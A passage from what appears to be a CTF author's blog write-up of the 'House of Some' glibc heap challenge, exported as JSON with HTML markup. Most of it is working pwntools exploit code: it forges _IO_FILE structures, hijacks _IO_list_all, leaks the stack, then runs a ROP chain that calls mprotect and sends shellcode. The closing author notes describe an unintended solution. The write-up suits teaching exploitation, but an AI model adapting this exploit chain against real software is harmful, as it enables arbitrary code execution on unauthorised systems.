class=\"string\">&#x27;_IO_file_jumps&#x27;</span>] - <span class=\"number\">0x48</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>) + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x50</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x600</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x610</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x300</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x2f0</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x360</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x210</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">environ = libc.symbols[<span class=\"string\">&#x27;__environ&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">name(<span class=\"number\">0xb0</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x00</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _flags</span></span><br><span class=\"line\">    <span class=\"number\">0x20</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_base</span></span><br><span class=\"line\">    <span class=\"number\">0x28</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_ptr</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"number\">0x38</span>: environ+<span class=\"number\">8</span>, <span class=\"comment\"># _IO_buf_base</span></span><br><span class=\"line\">    <span class=\"number\">0x40</span>: environ+<span class=\"number\">8</span>+<span class=\"number\">0x400</span>, <span class=\"comment\"># _IO_buf_end</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"number\">0x70</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _fileno</span></span><br><span class=\"line\">    <span class=\"number\">0x68</span>: environ+<span class=\"number\">8</span>, <span class=\"comment\"># _chain</span></span><br><span class=\"line\">    <span class=\"number\">0x82</span>: <span class=\"string\">b&quot;\\x00&quot;</span>, <span class=\"comment\"># _vtable_offset</span></span><br><span class=\"line\">    <span class=\"number\">0x88</span>: environ-<span class=\"number\">0x10</span>,</span><br><span class=\"line\">    <span class=\"number\">0xa0</span>: <span class=\"string\">b&quot;\\n&quot;</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">name(<span class=\"number\">0x20</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xc0</span>-<span class=\"number\">0x20</span>-<span class=\"number\">0xa0</span>: <span class=\"number\">2</span>, <span class=\"comment\"># _mode</span></span><br><span class=\"line\">    <span class=\"number\">0xd8</span>-<span class=\"number\">0x20</span>-<span class=\"number\">0xa0</span>: libc.symbols[<span class=\"string\">&#x27;_IO_wfile_jumps&#x27;</span>], <span class=\"comment\"># vtable</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)[:-<span class=\"number\">1</span>] + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">dev(<span class=\"number\">2</span>)</span><br><span class=\"line\">draw(libc.symbols[<span class=\"string\">&quot;_IO_list_all&quot;</span>] - <span class=\"number\">0x114514000</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">leave()</span><br><span class=\"line\"></span><br><span class=\"line\">hos = HouseOfSome(libc, environ+<span class=\"number\">8</span>, environ-<span class=\"number\">0x10</span>)</span><br><span class=\"line\">stack = hos.bomb_raw(io, libc.symbols[<span class=\"string\">&quot;_IO_flush_all&quot;</span>] + <span class=\"number\">481</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">f&quot;stack : <span class=\"subst\">&#123;stack:#x&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdx = <span class=\"number\">0x0000000000096272</span> + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">rop = ROP(libc)</span><br><span class=\"line\">rop.base = stack</span><br><span class=\"line\">rop.raw(pop_rdx)</span><br><span class=\"line\">rop.raw(<span class=\"number\">7</span>)</span><br><span class=\"line\">rop.call(<span class=\"string\">&#x27;mprotect&#x27;</span>, [stack &amp; (~<span class=\"number\">0xfff</span>), <span class=\"number\">0x1000</span>])</span><br><span class=\"line\">rop.raw(stack + <span class=\"number\">0x40</span>)</span><br><span class=\"line\">log.info(rop.dump())</span><br><span class=\"line\">rop_chain = rop.chain()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">assert</span> <span class=\"string\">b&quot;\\n&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> rop_chain, <span class=\"string\">&quot;\\\\n in rop_chain&quot;</span></span><br><span class=\"line\">io.sendline(rop_chain + shellcode)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;info&#x27;</span></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"碎碎念\"><a href=\"#碎碎念\" class=\"headerlink\" title=\"碎碎念\"></a>碎碎念</h2><p>出题的时候有些疏忽，忘记了main_arena也在libc内，导致可以off by null修改TopChunk，使得最后能够控制堆结构</p>\n<p>但是这个方法较为复杂，是一个小小的非预期，在比赛还有30个小时多的时候放出，在14小时之后出现第一血，最后只有5解出，算是预期之内吧</p>\n<p>接下来如果还有机会，我还会带来更加有趣的利用手法的题目，敬请期待吧</p>\n","path":"/p/houseofsome-ichunqiu/","permalink":"https://blog.csome.cc/p/houseofsome-ichunqiu/","tags":[{"name":"CTF","_id":"cuidvZ3AUibcKOkbkNEMC3ltU","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":15},{"name":"Pwn","_id":"cuid9EjKHYI0JNtcQl-odZaE8","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":15},{"name":"House","_id":"cuidBfThP-0OG38VMrLPRzbXy","slug":"House","path":"tags/House/","permalink":"https://blog.csome.cc/tags/House/","length":3}],"categories":[],"prev":{"title":"House of Some 2 —— 高版本Glibc的IO_FILE利用思路","date":"2024-01-29T07:34:23.000Z","slug":"house-of-some-2","published":true,"updated":"2025-10-28T08:00:40.767Z","_id":"cuidI7OhhiIRk7kqJXLcb544a","layout":"post","photos":[],"excerpt":"","path":"/p/house-of-some-2/","permalink":"https://blog.csome.cc/p/house-of-some-2/","__post":true},"next":{"title":"[Black Hat 2023] Pwn Houseofminho Csome writeup","date":"2023-11-18T03:37:18.000Z","slug":"houseofminho-wp","published":true,"updated":"2025-10-28T08:00:40.775Z","_id":"cuidMWkmSaBiKpzOhHxpZU9uy","layout":"post","photos":[],"excerpt":"","path":"/p/houseofminho-wp/","permalink":"https://blog.csome.cc/p/houseofminho-wp/","__post":true},"__post":true}